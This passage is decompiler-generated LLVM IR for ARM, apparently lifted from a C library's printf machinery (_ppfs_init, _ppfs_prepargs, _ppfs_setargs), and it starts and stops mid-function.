  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_136c0 ], [ %v2_13a24, %dec_label_pc_13b14 ], [ %v2_138a0, %dec_label_pc_1389c ]
  %v3_13b2c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_13b2c, i32* @r4, align 4
  br label %dec_label_pc_13b30

dec_label_pc_13b30:                               ; preds = %dec_label_pc_135d0, %dec_label_pc_13b2c
  %v0_13b30 = phi i32 [ %v0_13b30.pre, %dec_label_pc_135d0 ], [ %v3_13b2c, %dec_label_pc_13b2c ]
  %v0_13714 = phi i32 [ %tmp100, %dec_label_pc_135d0 ], [ %stack_var_-316.3, %dec_label_pc_13b2c ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_135d0 ], [ %stack_var_-336.3, %dec_label_pc_13b2c ]
  store i32 %v0_13b30, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_135e8.outer

dec_label_pc_135e8.outer:                         ; preds = %dec_label_pc_13b38, %dec_label_pc_13b30
  %v5_13614 = phi i32 [ %v1_13644, %dec_label_pc_13b38 ], [ %v0_13b30, %dec_label_pc_13b30 ]
  %v0_135e849 = phi i32 [ %v1_13b38, %dec_label_pc_13b38 ], [ %v0_13b30, %dec_label_pc_13b30 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_13b38 ], [ %stack_var_-336.4, %dec_label_pc_13b30 ]
  %v1_135e8180 = inttoptr i32 %v0_135e849 to i8*
  %v2_135e8181 = load i8, i8* %v1_135e8180, align 1
  %v3_135e8182 = zext i8 %v2_135e8181 to i32
  store i32 %v3_135e8182, i32* %r3.global-to-local, align 4
  %v2_135ec183 = icmp eq i8 %v2_135e8181, 0
  br i1 %v2_135ec183, label %dec_label_pc_13604, label %bb126

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13644
  %v1_13b38 = add i32 %v0_1364c, 2
  store i32 %v1_13b38, i32* @r4, align 4
  br label %dec_label_pc_135e8.outer

dec_label_pc_13b40:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_13b14, %.thread36, %dec_label_pc_13a60, %dec_label_pc_13a44, %dec_label_pc_13914, %bb162, %dec_label_pc_13878, %bb130, %dec_label_pc_13af0
  br label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13638, %bb, %dec_label_pc_135b8, %dec_label_pc_13b40
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_135b8 ], [ -1, %dec_label_pc_13b40 ], [ %stack_var_-336.2, %dec_label_pc_13638 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_13574, i32* @r5, align 4
  store i32 %v15_13574, i32* %r8.global-to-local, align 4
  store i32 %v18_13574, i32* @sb, align 4
  store i32 %v21_13574, i32* @sl, align 4
  store i32 %v24_13574, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_13b38, { 1, 0 }
  uselistorder i8 %v2_135e8181, { 1, 2, 0 }
  uselistorder i32 %v0_135e849, { 2, 0, 1 }
  uselistorder i32 %v5_13614, { 2, 3, 1, 0 }
  uselistorder i32 %v0_13714, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_13b30, { 1, 0, 2 }
  uselistorder i32 %v1_13ac4, { 2, 1, 0 }
  uselistorder i32 %v0_13acc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13a4c, { 1, 0 }
  uselistorder i32 %v2_13a30, { 2, 0, 1 }
  uselistorder i1 %v3_13a10, { 1, 0 }
  uselistorder i32 %v0_13a20, { 0, 2, 3, 1 }
  uselistorder i32 %v2_139f4, { 1, 0 }
  uselistorder i32 %v0_13a38, { 1, 0, 2 }
  uselistorder i32 %v3_139c8, { 1, 2, 0 }
  uselistorder i32 %v0_13978, { 1, 0 }
  uselistorder i32 %v2_1395c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_13924, { 1, 2, 0, 3 }
  uselistorder i32 %v0_138f0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_137f4, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_13810, { 1, 2, 3, 0 }
  uselistorder i32 %v6_13790, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_136f4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_136a4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_1369c, { 1, 0 }
  uselistorder i32 %v1_13644, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_13604, { 1, 0 }
  uselistorder i32 %v1_135fc.lcssa, { 1, 0 }
  uselistorder i8 %v2_135e8, { 1, 2, 0 }
  uselistorder i32 %v2_135fc, { 1, 2, 3, 0 }
  uselistorder i1 %v7_13808, { 1, 0 }
  uselistorder i1 %v7_13754, { 1, 2, 0 }
  uselistorder i1 %v7_1394c, { 1, 0 }
  uselistorder i1 %v7_138ac, { 1, 0 }
  uselistorder i1 %v7_13798, { 1, 0 }
  uselistorder i32 %v2_138ec, { 0, 2, 1, 3 }
  uselistorder i32 %v2_139bc, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_136cc, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_136a0, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_13680, { 1, 2, 0 }
  uselistorder i32 %v4_13678, { 1, 0 }
  uselistorder i32 %v2_1357c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 39, 4, 5, 2, 3, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 8, 7, 9, 10, 12, 11, 16, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 33, 30, 31, 32, 1, 34, 35, 36, 37, 13, 14, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13b48, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13b40, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_13b30, { 1, 0 }
  uselistorder label %dec_label_pc_13af0, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_13a60, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_13a0c, { 1, 0 }
  uselistorder label %dec_label_pc_139f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_139f0thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_139e4, { 1, 0 }
  uselistorder label %dec_label_pc_139d4, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_13968, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_13744, { 1, 0 }
  uselistorder label %dec_label_pc_13740, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13698, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_13638, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_13604, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_13b68 = load i32, i32* @r4, align 4
  store i32 %v3_13b68, i32* %stack_var_-12, align 4
  %v6_13b68 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_13b74 = load i32, i32* @r1, align 4
  store i32 %v0_13b74, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_13b7c = bitcast i32* %arg1 to i8*
  %v3_13b7c = call i32 @__GI_memset(i8* %v2_13b7c, i32 0)
  %v0_13b80 = load i32, i32* @r4, align 4
  %v1_13b80 = add i32 %v0_13b80, 24
  %v2_13b80 = inttoptr i32 %v1_13b80 to i32*
  %v3_13b80 = load i32, i32* %v2_13b80, align 4
  %v1_13b84 = add i32 %v3_13b80, -1
  store i32 %v1_13b84, i32* %v2_13b80, align 4
  %v0_13b8c = load i32, i32* @r5, align 4
  %v1_13b8c = load i32, i32* @r4, align 4
  %v2_13b8c = inttoptr i32 %v1_13b8c to i32*
  store i32 %v0_13b8c, i32* %v2_13b8c, align 4
  %v0_13b90 = load i32, i32* @r4, align 4
  %v1_13b90 = add i32 %v0_13b90, 40
  store i32 %v1_13b90, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_13ba019 = inttoptr i32 %v1_13b90 to i32*
  store i32 8, i32* %v2_13ba019, align 4
  %v3_13ba020 = load i32, i32* %r1.global-to-local, align 4
  %v4_13ba021 = add i32 %v3_13ba020, 4
  store i32 %v4_13ba021, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b98.dec_label_pc_13b98_crit_edge

dec_label_pc_13b98.dec_label_pc_13b98_crit_edge:  ; preds = %entry, %dec_label_pc_13b98.dec_label_pc_13b98_crit_edge
  %v4_13ba022 = phi i32 [ %v4_13ba021, %entry ], [ %v4_13ba0, %dec_label_pc_13b98.dec_label_pc_13b98_crit_edge ]
  %v0_13b9c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13b9c = add i32 %v0_13b9c.pre, -1
  store i32 %v1_13b9c, i32* %r2.global-to-local, align 4
  %v7_13b9c = icmp eq i32 %v0_13b9c.pre, 1
  %v2_13ba0 = inttoptr i32 %v4_13ba022 to i32*
  store i32 8, i32* %v2_13ba0, align 4
  %v3_13ba0 = load i32, i32* %r1.global-to-local, align 4
  %v4_13ba0 = add i32 %v3_13ba0, 4
  store i32 %v4_13ba0, i32* %r1.global-to-local, align 4
  br i1 %v7_13b9c, label %dec_label_pc_13ba8, label %dec_label_pc_13b98.dec_label_pc_13b98_crit_edge

dec_label_pc_13ba8:                               ; preds = %dec_label_pc_13b98.dec_label_pc_13b98_crit_edge
  %v0_13ba8 = load i32, i32* @r5, align 4
  store i32 %v0_13ba8, i32* %r2.global-to-local, align 4
  %v1_13bec3 = inttoptr i32 %v0_13ba8 to i8*
  %v2_13bec4 = load i8, i8* %v1_13bec3, align 1
  %v2_13bf06 = icmp eq i8 %v2_13bec4, 0
  br i1 %v2_13bf06, label %dec_label_pc_13bf8, label %dec_label_pc_13bb8

dec_label_pc_13bb0:                               ; preds = %dec_label_pc_13bd0
  %v2_13bb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13bb4, i32* @r4, align 4
  store i32 %v6_13b68, i32* @r5, align 4
  ret i32 -1

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13ba8, %dec_label_pc_13bec.backedge
  %v0_13bc0 = phi i32 [ %storemerge, %dec_label_pc_13bec.backedge ], [ %v0_13ba8, %dec_label_pc_13ba8 ]
  %v2_13bec7 = phi i8 [ %v2_13bec, %dec_label_pc_13bec.backedge ], [ %v2_13bec4, %dec_label_pc_13ba8 ]
  %v7_13bb8 = icmp eq i8 %v2_13bec7, 37
  br i1 %v7_13bb8, label %dec_label_pc_13bc0, label %dec_label_pc_13be8

dec_label_pc_13bc0:                               ; preds = %dec_label_pc_13bb8
  %v1_13bc0 = add i32 %v0_13bc0, 1
  %v2_13bc0 = inttoptr i32 %v1_13bc0 to i8*
  %v3_13bc0 = load i8, i8* %v2_13bc0, align 1
  store i32 %v1_13bc0, i32* %r2.global-to-local, align 4
  %v7_13bc4 = icmp eq i8 %v3_13bc0, 37
  br i1 %v7_13bc4, label %dec_label_pc_13be8, label %dec_label_pc_13bd0

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13bc0
  %v0_13bc8 = load i32, i32* @r4, align 4
  %v2_13bd0 = inttoptr i32 %v0_13bc8 to i32*
  store i32 %v1_13bc0, i32* %v2_13bd0, align 4
  %v2_13bd4 = call i32 @_ppfs_parsespec(i32* %v2_13bd0)
  %v1_13bd8 = icmp slt i32 %v2_13bd4, 0
  br i1 %v1_13bd8, label %dec_label_pc_13bb0, label %dec_label_pc_13be0

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bd0
  %v0_13be0 = load i32, i32* @r4, align 4
  %v1_13be0 = inttoptr i32 %v0_13be0 to i32*
  %v2_13be0 = load i32, i32* %v1_13be0, align 4
  br label %dec_label_pc_13bec.backedge

dec_label_pc_13be8:                               ; preds = %dec_label_pc_13bb8, %dec_label_pc_13bc0
  %v0_13be8 = phi i32 [ %v0_13bc0, %dec_label_pc_13bb8 ], [ %v1_13bc0, %dec_label_pc_13bc0 ]
  %v1_13be8 = add i32 %v0_13be8, 1
  br label %dec_label_pc_13bec.backedge

dec_label_pc_13bec.backedge:                      ; preds = %dec_label_pc_13be8, %dec_label_pc_13be0
  %storemerge = phi i32 [ %v1_13be8, %dec_label_pc_13be8 ], [ %v2_13be0, %dec_label_pc_13be0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_13bec = inttoptr i32 %storemerge to i8*
  %v2_13bec = load i8, i8* %v1_13bec, align 1
  %v2_13bf0 = icmp eq i8 %v2_13bec, 0
  br i1 %v2_13bf0, label %dec_label_pc_13bec.dec_label_pc_13bf8_crit_edge, label %dec_label_pc_13bb8

dec_label_pc_13bec.dec_label_pc_13bf8_crit_edge:  ; preds = %dec_label_pc_13bec.backedge
  %v0_13bf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13bf8

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13bec.dec_label_pc_13bf8_crit_edge, %dec_label_pc_13ba8
  %v0_13bf8 = phi i32 [ %v0_13bf8.pre, %dec_label_pc_13bec.dec_label_pc_13bf8_crit_edge ], [ %v0_13ba8, %dec_label_pc_13ba8 ]
  %v3_13bec.lcssa.in = phi i8 [ %v2_13bec, %dec_label_pc_13bec.dec_label_pc_13bf8_crit_edge ], [ %v2_13bec4, %dec_label_pc_13ba8 ]
  %v3_13bec.lcssa = zext i8 %v3_13bec.lcssa.in to i32
  %v1_13bf8 = load i32, i32* @r4, align 4
  %v2_13bf8 = inttoptr i32 %v1_13bf8 to i32*
  store i32 %v0_13bf8, i32* %v2_13bf8, align 4
  %v2_13bfc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13bfc, i32* @r4, align 4
  store i32 %v6_13b68, i32* @r5, align 4
  ret i32 %v3_13bec.lcssa

; uselistorder directives
  uselistorder i8 %v2_13bec, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_13ba8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13ba0, { 1, 0 }
  uselistorder i32 %v0_13b9c.pre, { 1, 0 }
  uselistorder i32 %v6_13b68, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_13be8, { 1, 0 }
  uselistorder label %dec_label_pc_13bb8, { 1, 0 }
  uselistorder label %dec_label_pc_13b98.dec_label_pc_13b98_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13c00 = load i32, i32* @r4, align 4
  store i32 %v3_13c00, i32* %stack_var_-12, align 4
  %v1_13c04 = add i32 %arg1, 24
  %v2_13c04 = inttoptr i32 %v1_13c04 to i32*
  %v3_13c04 = load i32, i32* %v2_13c04, align 4
  store i32 %v3_13c04, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_13c14 = add i32 %arg1, 76
  %v3_13c14 = inttoptr i32 %v2_13c14 to i32*
  store i32 %arg2, i32* %v3_13c14, align 4
  %v7_13c18 = icmp sgt i32 %v3_13c04, 0
  br i1 %v7_13c18, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_13c18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_13c18, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_13c1c = load i32, i32* %r3.global-to-local, align 4
  %v2_13c1c = add i32 %arg1, 8
  %v3_13c1c = inttoptr i32 %v2_13c1c to i32*
  store i32 %v0_13c1c, i32* %v3_13c1c, align 4
  %v0_13c20 = load i32, i32* %r5.global-to-local, align 4
  %v2_13c20 = add i32 %arg1, 28
  %v3_13c20 = inttoptr i32 %v2_13c20 to i32*
  store i32 %v0_13c20, i32* %v3_13c20, align 4
  %v0_13c24 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13c24, i32* %v2_13c04, align 4
  %v0_13c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c28 = add i32 %arg1, 4
  %v3_13c28 = inttoptr i32 %v2_13c28 to i32*
  store i32 %v0_13c28, i32* %v3_13c28, align 4
  %v0_13c2c = call i32 @_ppfs_setargs()
  %v0_13c30 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c30 = load i32, i32* @r4, align 4
  %v2_13c30 = add i32 %v1_13c30, 24
  %v3_13c30 = inttoptr i32 %v2_13c30 to i32*
  store i32 %v0_13c30, i32* %v3_13c30, align 4
  %v2_13c34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13c34, i32* @r4, align 4
  ret i32 %v0_13c2c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 6, 5, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13c38 = load i32, i32* @r0, align 4
  %v1_13c38 = add i32 %v0_13c38, 24
  %v2_13c38 = inttoptr i32 %v1_13c38 to i32*
  %v3_13c38 = load i32, i32* %v2_13c38, align 4
  store i32 %v3_13c38, i32* %r1.global-to-local, align 4
  %v2_13c3c = icmp eq i32 %v3_13c38, 0
  %v3_13c40 = load i32, i32* @r4, align 4
  store i32 %v3_13c40, i32* %stack_var_-8, align 4
  %v1_13c44 = add i32 %v0_13c38, 80
  store i32 %v1_13c44, i32* %ip.global-to-local, align 4
  %v1_13c48 = add i32 %v0_13c38, 8
  %v2_13c48 = inttoptr i32 %v1_13c48 to i32*
  %v3_13c48 = load i32, i32* %v2_13c48, align 4
  store i32 %v3_13c48, i32* %r3.global-to-local, align 4
  %v6_13c50 = icmp eq i32 %v3_13c48, -2147483648
  br i1 %v2_13c3c, label %dec_label_pc_13c50, label %dec_label_pc_13d74

dec_label_pc_13c50:                               ; preds = %entry
  br i1 %v6_13c50, label %dec_label_pc_13c58, label %dec_label_pc_13c70

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13c50
  %v1_13c58 = add i32 %v0_13c38, 76
  %v2_13c58 = inttoptr i32 %v1_13c58 to i32*
  %v3_13c58 = load i32, i32* %v2_13c58, align 4
  store i32 %v3_13c58, i32* %r3.global-to-local, align 4
  %v1_13c5c = inttoptr i32 %v3_13c58 to i32*
  %v2_13c5c = load i32, i32* %v1_13c5c, align 4
  store i32 %v2_13c5c, i32* %r2.global-to-local, align 4
  %v1_13c60 = add i32 %v3_13c58, 4
  store i32 %v1_13c60, i32* %r3.global-to-local, align 4
  store i32 %v1_13c60, i32* %v2_13c58, align 4
  %v0_13c68 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c68 = load i32, i32* @r0, align 4
  %v2_13c68 = add i32 %v1_13c68, 8
  %v3_13c68 = inttoptr i32 %v2_13c68 to i32*
  store i32 %v0_13c68, i32* %v3_13c68, align 4
  %v0_13c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_13c6c = load i32, i32* @r0, align 4
  %v2_13c6c = add i32 %v1_13c6c, 80
  %v3_13c6c = inttoptr i32 %v2_13c6c to i32*
  store i32 %v0_13c6c, i32* %v3_13c6c, align 4
  %v0_13c70.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13c70

dec_label_pc_13c70:                               ; preds = %dec_label_pc_13c50, %dec_label_pc_13c58
  %v1_13c88 = phi i32 [ %v0_13c38, %dec_label_pc_13c50 ], [ %v0_13c70.pre, %dec_label_pc_13c58 ]
  %v1_13c70 = add i32 %v1_13c88, 4
  %v2_13c70 = inttoptr i32 %v1_13c70 to i32*
  %v3_13c70 = load i32, i32* %v2_13c70, align 4
  store i32 %v3_13c70, i32* %r3.global-to-local, align 4
  %v6_13c74 = icmp eq i32 %v3_13c70, -2147483648
  br i1 %v6_13c74, label %dec_label_pc_13c7c, label %dec_label_pc_13c94

dec_label_pc_13c7c:                               ; preds = %dec_label_pc_13c70
  %v1_13c7c = add i32 %v1_13c88, 76
  %v2_13c7c = inttoptr i32 %v1_13c7c to i32*
  %v3_13c7c = load i32, i32* %v2_13c7c, align 4
  store i32 %v3_13c7c, i32* %r3.global-to-local, align 4
  %v1_13c80 = inttoptr i32 %v3_13c7c to i32*
  %v2_13c80 = load i32, i32* %v1_13c80, align 4
  store i32 %v2_13c80, i32* %r2.global-to-local, align 4
  %v1_13c84 = add i32 %v3_13c7c, 4
  store i32 %v1_13c84, i32* %r3.global-to-local, align 4
  store i32 %v1_13c84, i32* %v2_13c7c, align 4
  %v0_13c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_13c8c = load i32, i32* @r0, align 4
  %v2_13c8c = add i32 %v1_13c8c, 4
  %v3_13c8c = inttoptr i32 %v2_13c8c to i32*
  store i32 %v0_13c8c, i32* %v3_13c8c, align 4
  %v0_13c90 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c90 = load i32, i32* @r0, align 4
  %v2_13c90 = add i32 %v1_13c90, 80
  %v3_13c90 = inttoptr i32 %v2_13c90 to i32*
  store i32 %v0_13c90, i32* %v3_13c90, align 4
  %v0_13d6418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c70, %dec_label_pc_13c7c
  %v0_13d6418 = phi i32 [ %v1_13c88, %dec_label_pc_13c70 ], [ %v0_13d6418.pre, %dec_label_pc_13c7c ]
  %v0_13c94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13c94, i32* %lr.global-to-local, align 4
  %v1_13d6419 = add i32 %v0_13d6418, 28
  %v2_13d6420 = inttoptr i32 %v1_13d6419 to i32*
  %v3_13d6421 = load i32, i32* %v2_13d6420, align 4
  store i32 %v3_13d6421, i32* %r3.global-to-local, align 4
  %v5_13d6c23 = icmp slt i32 %v0_13c94, %v3_13d6421
  br i1 %v5_13d6c23, label %dec_label_pc_13c9c, label %dec_label_pc_13d70.loopexit

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_13d60
  %v0_13d6425 = phi i32 [ %v0_13d64, %dec_label_pc_13d60 ], [ %v0_13d6418, %dec_label_pc_13c94 ]
  %v1_13c9c24 = phi i32 [ %v1_13d60, %dec_label_pc_13d60 ], [ %v0_13c94, %dec_label_pc_13c94 ]
  %v4_13c9c = mul i32 %v1_13c9c24, 4
  %v5_13c9c = add i32 %v0_13d6425, %v4_13c9c
  store i32 %v5_13c9c, i32* %r3.global-to-local, align 4
  %v1_13ca0 = add i32 %v5_13c9c, 40
  %v2_13ca0 = inttoptr i32 %v1_13ca0 to i32*
  %v3_13ca0 = load i32, i32* %v2_13ca0, align 4
  store i32 %v3_13ca0, i32* %r2.global-to-local, align 4
  %v7_13ca4 = icmp eq i32 %v3_13ca0, 8
  br i1 %v7_13ca4, label %dec_label_pc_13d60, label %dec_label_pc_13cac

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13c9c
  %v1_13cac = add i32 %v0_13d6425, 76
  %v2_13cac = inttoptr i32 %v1_13cac to i32*
  %v3_13cac = load i32, i32* %v2_13cac, align 4
  store i32 %v3_13cac, i32* %r1.global-to-local, align 4
  %v8_13cb0 = icmp sgt i32 %v3_13ca0, 8
  br i1 %v8_13cb0, label %dec_label_pc_13cd4, label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13cac
  %v7_13cb4 = icmp eq i32 %v3_13ca0, 2
  br i1 %v7_13cb4, label %dec_label_pc_13d20, label %dec_label_pc_13cbc

dec_label_pc_13cbc:                               ; preds = %dec_label_pc_13cb4
  %v8_13cbc = icmp sgt i32 %v3_13ca0, 2
  br i1 %v8_13cbc, label %dec_label_pc_13ccc, label %dec_label_pc_13cc0

dec_label_pc_13cc0:                               ; preds = %dec_label_pc_13cbc
  %v1_13cc0 = icmp slt i32 %v3_13ca0, 0
  br i1 %v1_13cc0, label %dec_label_pc_13d4c, label %dec_label_pc_13d20

dec_label_pc_13ccc:                               ; preds = %dec_label_pc_13cbc
  %v7_13ccc = icmp eq i32 %v3_13ca0, 7
  br i1 %v7_13ccc, label %dec_label_pc_13d34, label %dec_label_pc_13d4c

dec_label_pc_13cd4:                               ; preds = %dec_label_pc_13cac
  %v7_13cd4 = icmp eq i32 %v3_13ca0, 1024
  br i1 %v7_13cd4, label %dec_label_pc_13d20, label %dec_label_pc_13cdc

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13cd4
  %v8_13cdc = icmp sgt i32 %v3_13ca0, 1024
  br i1 %v8_13cdc, label %dec_label_pc_13cf4, label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %dec_label_pc_13cdc
  switch i32 %v3_13ca0, label %dec_label_pc_13d4c [
    i32 256, label %dec_label_pc_13d20
    i32 512, label %dec_label_pc_13d20
  ]

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cdc
  %v7_13cf4 = icmp eq i32 %v3_13ca0, 2048
  br i1 %v7_13cf4, label %dec_label_pc_13d0c, label %dec_label_pc_13d04

dec_label_pc_13d04:                               ; preds = %dec_label_pc_13cf4
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_13d00 = icmp eq i32 %v3_13ca0, 2055
  br i1 %v9_13d00, label %dec_label_pc_13d34, label %dec_label_pc_13d4c

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13cf4
  %v1_13d0c = add i32 %v3_13cac, 8
  store i32 %v1_13d0c, i32* %r3.global-to-local, align 4
  store i32 %v1_13d0c, i32* %v2_13cac, align 4
  %v0_13d14 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d14 = inttoptr i32 %v0_13d14 to i32*
  %v2_13d14 = load i32, i32* %v1_13d14, align 4
  store i32 %v2_13d14, i32* %r3.global-to-local, align 4
  %v3_13d14 = add i32 %v0_13d14, 4
  %v4_13d14 = inttoptr i32 %v3_13d14 to i32*
  %v5_13d14 = load i32, i32* %v4_13d14, align 4
  store i32 %v5_13d14, i32* %r4.global-to-local, align 4
  %v0_13d18 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d18 = inttoptr i32 %v0_13d18 to i32*
  store i32 %v2_13d14, i32* %v1_13d18, align 4
  %v3_13d18 = add i32 %v0_13d18, 4
  %v4_13d18 = inttoptr i32 %v3_13d18 to i32*
  %v5_13d18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13d18, i32* %v4_13d18, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d20:                               ; preds = %dec_label_pc_13ce0, %dec_label_pc_13ce0, %dec_label_pc_13cc0, %dec_label_pc_13cd4, %dec_label_pc_13cb4
